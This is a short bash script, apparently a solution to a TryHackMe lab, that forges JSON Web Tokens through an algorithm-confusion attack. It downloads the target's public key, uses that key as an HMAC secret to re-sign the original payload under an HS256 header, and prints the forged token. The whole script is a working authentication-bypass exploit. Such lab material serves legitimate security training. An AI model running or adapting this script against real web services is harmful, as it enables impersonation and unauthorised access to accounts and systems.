#!/usr/bin/env bash
modifiedheader="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
modifiedheaderfile="modifiedheader.txt"
modifiedsecretfile="modifiedsecret.txt"
newjwtfile="newjwt.txt"
payloadfile="payload.txt"
pemfile="public.pem"
hexpemfile="hexpublic.pem"
hexkeyfile="hexkey.txt"
pythonfilename="jwtTryHackMe.py"

echo "IP of deployed machine: "  
read ip  
echo "Paste JWT Token: "
read originaltoken

echo ${originaltoken} | cut -d "." -f 2 $2 > ${payloadfile}
curl "http://${ip}/public.pem" -o ${pemfile}
echo "${modifiedheader}" > ${modifiedheaderfile}
cat ${pemfile} | xxd -p | tr -d "\\n" > ${hexpemfile}
echo -n "$(cat ${modifiedheaderfile}).$(cat ${payloadfile})" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat ${hexpemfile}) | awk '{print $2}' > ${hexkeyfile}
export HEXKEY=$(cat ${hexkeyfile})
python3 ${pythonfilename} > ${modifiedsecretfile}
echo "$(cat ${modifiedheaderfile}).$(cat ${payloadfile}).$(cat ${modifiedsecretfile})" > ${newjwtfile}
printf "New JWT Token:\n"
cat ${newjwtfile}